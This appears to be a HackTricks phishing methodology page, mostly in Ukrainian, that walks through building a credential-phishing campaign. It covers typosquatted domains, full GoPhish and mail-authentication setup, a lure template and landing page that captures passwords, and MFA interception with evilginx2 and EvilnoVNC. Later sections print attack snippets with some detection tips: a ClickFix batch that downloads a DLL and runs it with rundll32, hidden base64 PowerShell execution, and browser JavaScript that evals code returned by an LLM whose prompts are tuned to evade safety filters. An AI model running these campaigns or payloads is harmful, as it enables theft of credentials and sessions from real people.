# Phishing Методологія

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Recon жертви
1. Виберіть **домен жертви**.
2. Виконайте базову веб-енумерацію, **шукаючи портали входу**, які використовує жертва, і **вирішіть**, який із них ви будете **імітувати**.
3. Використайте **OSINT**, щоб **знайти електронні адреси**.
2. Підготуйте середовище
1. **Придбайте домен**, який ви збираєтесь використовувати для оцінки phishing
2. **Налаштуйте записи**, пов'язані з email-сервісом (SPF, DMARC, DKIM, rDNS)
3. Налаштуйте VPS з **gophish**
3. Підготуйте кампанію
1. Підготуйте **шаблон листа**
2. Підготуйте **веб-сторінку** для викрадення облікових даних
4. Запустіть кампанію!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Автоматичні інструменти**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Вебсайти**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Існує ймовірність, що один або декілька бітів, збережених або під час передачі, можуть автоматично змінитися через різні фактори, такі як сонячні спалахи, космічні промені або апаратні помилки.

Коли ця концепція **застосовується до DNS-запитів**, можливо, що **домен, який отримує DNS-сервер**, не є тим самим, що було спочатку запрошено.

Наприклад, модифікація одного біта в домені "windows.com" може змінити його на "windnws.com."

Зловмисники можуть **використовувати це, реєструючи кілька bit-flipping доменів**, схожих на домен жертви. Їх намір — перенаправити легітимних користувачів на власну інфраструктуру.

Для отримання додаткової інформації читайте [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Ви можете шукати на [https://www.expireddomains.net/](https://www.expireddomains.net) прострочений домен, який ви могли б використати.\
Щоб переконатися, що прострочений домен, який ви збираєтесь купити, **вже має гарний SEO**, ви можете перевірити, як його категоризують у:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Щоб **виявити більше** дійсних електронних адрес або **перевірити ті**, які ви вже знайшли, ви можете перевірити, чи можна виконати brute-force smtp-серверів жертви. [Дізнайтеся, як перевіряти/знаходити електронні адреси тут](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Крім того, не забувайте, що якщо користувачі використовують будь-який веб-портал для доступу до своєї пошти, ви можете перевірити, чи вразливий він до username brute force, і, за можливості, експлуатувати цю вразливість.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Налаштування

**Налаштування сертифіката TLS**

Перед цим кроком ви повинні **вже придбати домен**, який ви збираєтеся використовувати, і він має **вказувати** на **IP of the VPS**, де ви налаштовуєте **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Налаштування пошти**

Почніть встановлення: `apt-get install postfix`

Потім додайте домен у наступні файли:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Також змініть значення наступних змінних у /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Нарешті змініть файли **`/etc/hostname`** та **`/etc/mailname`** на ваш домен і **перезапустіть свій VPS.**

Тепер створіть **DNS A record** для `mail.<domain>`, що вказує на **IP-адресу** VPS, та **DNS MX** запис, що вказує на `mail.<domain>`

Тепер давайте протестуємо відправку листа:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Конфігурація Gophish**

Зупиніть виконання gophish і налаштуємо його.\
Змініть `/opt/gophish/config.json` на наступне (зверніть увагу на використання https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Налаштування служби gophish**

Щоб створити службу gophish, яку можна автоматично запускати та керувати нею як службою, створіть файл `/etc/init.d/gophish` з таким вмістом:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Завершіть налаштування сервісу та перевірте його роботу, виконавши:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Налаштування поштового сервера та домену

### Зачекайте та дійте легітимно

Чим старіший домен, тим менша ймовірність, що його позначать як спам. Тому вам слід чекати якомога довше (принаймні 1 тиждень) перед phishing-оцінкою. Крім того, якщо ви розмістите сторінку, пов'язану з репутаційною тематикою, отримана репутація буде кращою.

Зауважте, що навіть якщо потрібно почекати тиждень, ви можете закінчити налаштування вже зараз.

### Налаштування зворотного DNS (rDNS) запису

Встановіть rDNS (PTR) запис, який відображає IP-адресу VPS на ім'я домену.

### Sender Policy Framework (SPF) запис

Ви повинні **налаштувати SPF запис для нового домену**. Якщо ви не знаєте, що таке SPF запис, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Ви можете використати [https://www.spfwizard.net/](https://www.spfwizard.net) для генерації вашої SPF політики (використовуйте IP VPS)

![](<../../images/image (1037).png>)

Це вміст, який потрібно встановити всередині TXT запису в домені:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Аутентифікація повідомлень на основі домену, звітування та відповідність (DMARC) — запис

Ви повинні **налаштувати DMARC-запис для нового домену**. Якщо ви не знаєте, що таке DMARC-запис, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Вам потрібно створити новий DNS TXT-запис, що вказує на хост `_dmarc.<domain>`, зі наступним вмістом:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ви повинні **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DMARC [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Потрібно об'єднати обидва B64 значення, які генерує ключ DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

Ви можете зробити це, використовуючи [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку й надішліть листа на адресу, яку вони вам надають:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ви також можете **перевірити конфігурацію електронної пошти**, надіславши листа на `check-auth@verifier.port25.com` і **прочитавши відповідь** (для цього потрібно **відкрити** порт **25** і переглянути відповідь у файлі _/var/mail/root_, якщо ви надсилаєте лист від root).\
Переконайтеся, що ви проходите всі тести:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ви також можете надіслати **повідомлення на Gmail під вашим контролем**, і перевірити **заголовки електронного листа** у вашій папці Вхідні у Gmail, у полі заголовка `Authentication-Results` має бути присутній `dkim=pass`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Видалення з чорного списку Spamhouse

Сторінка [www.mail-tester.com](https://www.mail-tester.com) може вказати, чи ваш домен блокується Spamhouse. Ви можете запросити видалення вашого домену/IP за адресою: [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Видалення з чорного списку Microsoft

Ви можете запросити видалення вашого домену/IP за адресою [https://sender.office.com/](https://sender.office.com).

## Створення та запуск кампанії GoPhish

### Профіль відправника

- Задайте **назву для ідентифікації** профілю відправника
- Визначте, з якого облікового запису ви надсилатимете phishing emails. Пропозиції: _noreply, support, servicedesk, salesforce..._
- Ви можете залишити ім'я користувача та пароль порожніми, але переконайтесь, що встановлено Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Рекомендується використовувати функцію "**Send Test Email**" щоб перевірити, що все працює.\
> Рекомендую **відправляти тестові листи на адреси 10min mails**, щоб уникнути внесення до чорного списку під час тестувань.

### Шаблон листа

- Задайте **назву для ідентифікації** шаблону
- Потім напишіть **subject** (нічого дивного, просто те, що ви могли б очікувати прочитати у звичайному листі)
- Переконайтеся, що встановлено опцію "**Add Tracking Image**"
- Напишіть **шаблон листа** (ви можете використовувати змінні, як у наступному прикладі):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Зауважте, що **щоб підвищити правдоподібність листа**, рекомендовано використати якийсь підпис із реального листа від клієнта. Пропозиції:

- Надішліть листа на **неіснуючу адресу** і перевірте, чи відповідь містить підпис.
- Знайдіть **публічні адреси** типу info@ex.com або press@ex.com чи public@ex.com і надішліть їм листа, зачекавши на відповідь.
- Спробуйте зв’язатися з **якою-небудь знайденою валідною** адресою і дочекайтесь відповіді

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Напишіть **ім'я**
- **Вставте HTML-код** веб-сторінки. Зверніть увагу, що ви можете **імпортувати** веб-сторінки.
- Відмітьте **Capture Submitted Data** і **Capture Passwords**
- Встановіть **перенаправлення**

![](<../../images/image (826).png>)

> [!TIP]
> Зазвичай потрібно змінювати HTML-код сторінки та тестувати локально (наприклад, використовуючи Apache) **доки ви не отримаєте бажаний результат.** Потім вставте цей HTML-код у поле.\
> Зверніть увагу, що якщо вам потрібні **статичні ресурси** для HTML (наприклад CSS або JS), ви можете зберегти їх у _**/opt/gophish/static/endpoint**_ і потім звертатися до них через _**/static/\<filename>**_

> [!TIP]
> Для перенаправлення ви можете **перенаправляти користувачів на легітимну головну сторінку** жертви, або перенаправити їх на _/static/migration.html_, наприклад показати **спінер (**[**https://loading.io/**](https://loading.io)**) на 5 секунд, а потім повідомити, що процес пройшов успішно**.

### Users & Groups

- Встановіть назву
- **Імпортуйте дані** (зауважте, що щоб використати шаблон у прикладі, вам потрібні firstname, last name та email address кожного користувача)

![](<../../images/image (163).png>)

### Campaign

Наприкінці створіть кампанію, обравши назву, email template, landing page, URL, sending profile та group. Зверніть увагу, що URL буде лінком, відправленим жертвам

Зверніть увагу, що **Sending Profile дозволяє надіслати тестовий лист, щоб подивитися, як виглядатиме фінальний фішинговий лист**:

![](<../../images/image (192).png>)

> [!TIP]
> Я б порадив **надсилати тестові листи на 10min mail адреси**, щоб уникнути попадання в чорні списки під час тестів.

Якщо все готово — просто запустіть кампанію!

## Website Cloning

Якщо з якоїсь причини ви хочете клонувати сайт, перевірте наступну сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

У деяких фішингових оцінках (насамперед для Red Teams) ви захочете також **надсилати файли, що містять якийсь бекдор** (наприклад C2 або щось, що тригерить аутентифікацію).\
Дивіться наступну сторінку для прикладів:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Попередня атака досить хитра, оскільки ви підроблюєте реальний сайт і збираєте введені користувачем дані. На жаль, якщо користувач не ввів правильний пароль або якщо додаток, який ви підробили, налаштований з 2FA, **ці дані не дозволять вам видати себе за обманутого користувача**.

Тут корисні інструменти типу [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) та [**muraena**](https://github.com/muraenateam/muraena). Ці інструменти дозволяють організувати MitM-атаку. Виглядає це приблизно так:

1. Ви **імітуєте форму login** реальної веб-сторінки.
2. Користувач **надсилає** свої **credentials** на вашу фальшиву сторінку, і інструмент пересилає їх на реальний сайт, **перевіряючи, чи працюють credentials**.
3. Якщо обліковий запис налаштований з **2FA**, MitM-сторінка попросить його і, коли **користувач введе** код, інструмент передасть його на реальний сайт.
4. Після автентифікації ви (як атакуючий) отримаєте **захоплені credentials, 2FA, cookie та будь-яку інформацію** про кожну взаємодію під час роботи інструмента в режимі MitM.

### Via VNC

Що якщо замість того, щоб **посилати жертву на зловмисну сторінку**, яка виглядає як оригінал, ви направите її в **VNC-сесію з браузером, підключеним до реального сайту**? Ви зможете бачити її дії, вкрасти пароль, MFA, cookies...\
Це можна зробити за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Очевидно, один із найпростіших способів дізнатися, що вас викрили — **перевірити ваш домен у чорних списках**. Якщо він там з’явився, то ваш домен якийсь інструмент позначив як підозрілий.\
Один з простих способів перевірити, чи є ваш домен у чорному списку — використати [https://malwareworld.com/](https://malwareworld.com)

Однак є й інші способи дізнатися, чи **жертва активно шукає підозрілі фішингові ресурси**, як пояснено у:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **купити домен з дуже схожою назвою** на домен жертви **і/або згенерувати сертифікат** для **субдомену** контрольованого вами домену, що **містить** ключове слово домену жертви. Якщо **жертва** виконає будь-яку взаємодію по DNS або HTTP з такими ресурсами, ви дізнаєтесь, що **вона активно шукає** підозрілі домени і вам потрібно бути дуже стелс.

### Evaluate the phishing

Використайте [**Phishious** ](https://github.com/Rices/Phishious), щоб оцінити, чи ваш лист потрапить у папку спаму, чи буде заблокований, чи пройде успішно.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Сучасні набори атак усе частіше повністю пропускають email-атрибуцію і **безпосередньо таргетують сервіс-деск / процес відновлення ідентичності**, щоб обійти MFA. Атака виконується «living-off-the-land»: коли оператор має валідні credentials, він рухається далі за допомогою вбудованих адмінінструментів — без необхідності в malware.

### Attack flow
1. Recon жертви
* Збирайте особисті й корпоративні дані з LinkedIn, витоків, публічних GitHub тощо.
* Ідентифікуйте цінні облікові записи (executives, IT, finance) і з'ясуйте **точний help-desk процес** для скидання пароля / MFA.
2. Real-time social engineering
* Дзвінки, Teams або чат службі підтримки, удаючи цільову особу (часто з **підробленим caller-ID** або **клонованим голосом**).
* Надайте зібрані PII для проходження перевірки на підставі знань.
* Переконайте агента **скинути MFA secret** або виконати **SIM-swap** на зареєстрований мобільний номер.
3. Негайні дії після доступу (≤60 хв у реальних випадках)
* Встановіть foothold через будь-який веб-SSO портал.
* Перелічіть AD / AzureAD за допомогою вбудованих інструментів (без завантаження бінарників):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Переміщення латералізовано з використанням **WMI**, **PsExec**, або легітимних **RMM** агентів, які вже в білому списку в середовищі.

### Detection & Mitigation
* Розглядайте відновлення ідентичності через help-desk як **операцію з привілеями** — вимагайте step-up auth і затвердження менеджера.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, що сповіщають про:
* зміну методу MFA + автентифікацію з нового пристрою / геолокації.
* негайне підвищення привілеїв того самого принципала (user → admin).
* Записуйте дзвінки help-desk і вимагайте **дзвінка назад на вже зареєстрований номер** перед будь-яким скиданням.
* Впровадьте **Just-In-Time (JIT) / Privileged Access**, щоб щойно скинуті акаунти **не** автоматично успадковували високопривілейовані токени.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Комерційні групи компенсують витрати на high-touch операції масовими атаками, що перетворюють **пошукові системи та рекламні мережі на канал доставки**.

1. **SEO poisoning / malvertising** просуває фейковий результат типу `chromium-update[.]site` у верхні рекламні позиції.
2. Жертва завантажує невеликий **first-stage loader** (часто JS/HTA/ISO). Приклади, що бачив Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader ексфільтрує cookies браузера + credential DBs, потім завантажує **silent loader**, який вирішує — *в реальному часі* — що розгорнути:
* RAT (наприклад AsyncRAT, RustDesk)
* ransomware / wiper
* компонент персистенції (ключ Run в реєстрі + scheduled task)

### Hardening tips
* Блокуйте нові зареєстровані домени і накладайте **Advanced DNS / URL Filtering** як на пошукові оголошення, так і на email.
* Обмежте встановлення софту підписаними MSI / Store пакетами, забороніть виконання `HTA`, `ISO`, `VBS` політикою.
* Моніторьте дочірні процеси браузерів, що відкривають інсталятори:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Полюйте на LOLBins, які часто зловживають першостадійні лоадери (наприклад `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Ловушка: клоноване повідомлення державного CERT з кнопкою **Update**, яка показує покрокові інструкції «виправлення». Жертвам пропонують запустити батч, що завантажує DLL та виконує її через `rundll32`.
* Типова батч-ланцюжок, що спостерігався:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` кладе пейлоад у `%TEMP%`, коротка пауза ховає мерехтіння мережі, потім `rundll32` викликає експортовану точку входу (`notepad`).
* DLL маячить ідентифікацію хоста та опитує C2 кожні кілька хвилин. Віддалене завдання приходить як **PowerShell, закодований у base64**, що виконується приховано з обходом політик:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Це зберігає гнучкість C2 (сервер може змінювати завдання без оновлення DLL) і ховає консолі. Шукайте PowerShell-процеси дітей `rundll32.exe` з `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` разом.
* Захисники можуть шукати HTTP(S) callback-и виду `...page.php?tynor=<COMPUTER>sss<USER>` і інтервали опитування ~5 хв після завантаження DLL.

---

## AI-Enhanced Phishing Operations
Атакувальники тепер зв’язують **LLM & voice-clone API** для повністю персоналізованих приманок і взаємодії в реальному часі.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Додавайте **динамічні банери**, що виділяють повідомлення, відправлені з ненадійної автоматизації (через ARC/DKIM аномалії).  
• Розгорніть **voice-biometric challenge phrases** для високоризикових телефонних запитів.  
• Постійно симулюйте ШІ-генеровані приманки у програмах підвищення обізнаності — статичні шаблони застаріли.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Атакувальники можуть відправляти виглядно нешкідливий HTML і **генерувати stealer під час виконання**, звертаючись до **довіреного LLM API** за JavaScript, а потім виконуючи його в браузері (наприклад через `eval` або динамічний `<script>`).

1. **Prompt-as-obfuscation:** кодуйте exfil URLs/Base64 рядки у prompt; ітеруйте формулювання, щоб обійти фільтри безпеки і знизити hallucinations.
2. **Client-side API call:** при завантаженні JS викликає публічний LLM (Gemini/DeepSeek/etc.) або CDN-проксі; у статичному HTML присутній лише prompt/API-виклик.
3. **Assemble & exec:** конкатенуйте відповідь і виконуйте її (поліморфно для кожного візиту):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** згенерований код персоналізує приманку (наприклад, LogoKit token parsing) і надсилає creds на prompt-hidden endpoint.

**Evasion traits**
- Трафік звертається до відомих доменів LLM або до репутаційних CDN-проксі; іноді через WebSockets до бекенду.
- Відсутній статичний payload; шкідливий JS з'являється тільки після рендерингу.
- Недетерміновані генерації породжують **унікальні** stealers для кожної сесії.

**Detection ideas**
- Run sandboxes з увімкненим JS; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Окрім класичного push-bombing, оператори просто **force a new MFA registration** під час дзвінка до help-desk, що анулює існуючий token користувача. Будь-який наступний запит на вхід виглядає для жертви легітимним.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.



## Clipboard Hijacking / Pastejacking

Атакувальники можуть тихо скопіювати шкідливі команди в clipboard жертви з компрометованої або typosquatted веб‑сторінки, а потім обманом змусити користувача вставити їх у **Win + R**, **Win + X** або в термінал, виконуючи довільний код без жодного завантаження чи вкладення.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* APK вбудовує статичні облікові дані та індивідуальні для профілю “unlock codes” (no server auth). Жертви проходять фейковий потік ексклюзивності (login → locked profiles → unlock) і при правильних кодах перенаправляються у WhatsApp-чати з номерами, контрольованими атакуючим `+92`, поки spyware працює непомітно.
* Збирання починається ще до login: негайний exfil **device ID**, контакти (як `.txt` з кешу) та документи (images/PDF/Office/OpenXML). Content observer автоматично завантажує нові фото; scheduled job повторно сканує на наявність нових документів кожні **5 хвилин**.
* Persistence: реєструється для `BOOT_COMPLETED` і підтримує живий **foreground service**, щоб вижити після перезавантажень і в разі видалення з фону.

### WhatsApp device-linking hijack via QR social engineering
* Луре-сторінка (наприклад, підробний канал міністерства/CERT) відображає WhatsApp Web/Desktop QR і просить жертву відсканувати його, тихо додаючи атакуючого як **linked device**.
* Атакуючий миттєво отримує видимість чатів/контактів до моменту видалення сесії. Жертви можуть пізніше побачити повідомлення «new device linked»; захисники можуть шукати несподівані device-link події невдовзі після відвідувань неперевірених QR-сторінок.

### Mobile‑gated phishing to evade crawlers/sandboxes
Оператори все частіше ставлять їх phishing-потоки за просту перевірку пристрою, щоб десктопні краулери ніколи не доходили до фінальних сторінок. Типовий патерн — невеликий скрипт, який перевіряє, чи DOM підтримує сенсор, і відправляє результат на server endpoint; немобільні клієнти отримують HTTP 500 (або порожню сторінку), тоді як мобільним користувачам показується повний потік.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logic (спрощено):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Типова поведінка сервера, часто спостережувана:
- Встановлює сесійну cookie під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або placeholder) у відповідь на наступні GET, коли `is_mobile=false`; віддає phishing лише якщо `true`.

Пошук і евристики виявлення:
- urlscan запит: `filename:"detect_device.js" AND page.status:500`
- Веб-телеметрія: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для non‑mobile; легітимні mobile шляхи жертв повертають 200 з подальшим HTML/JS.
- Блокуйте або ретельно перевіряйте сторінки, які роблять контент залежним виключно від `ontouchstart` або подібних перевірок пристрою.

Поради з захисту:
- Виконуйте crawlers з mobile‑like fingerprints та увімкненим JS, щоб виявити gated content.
- Налаштуйте оповіщення про підозрілі відповіді 500, що слідують за `POST /detect` на новозареєстрованих доменах.

## Посилання

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
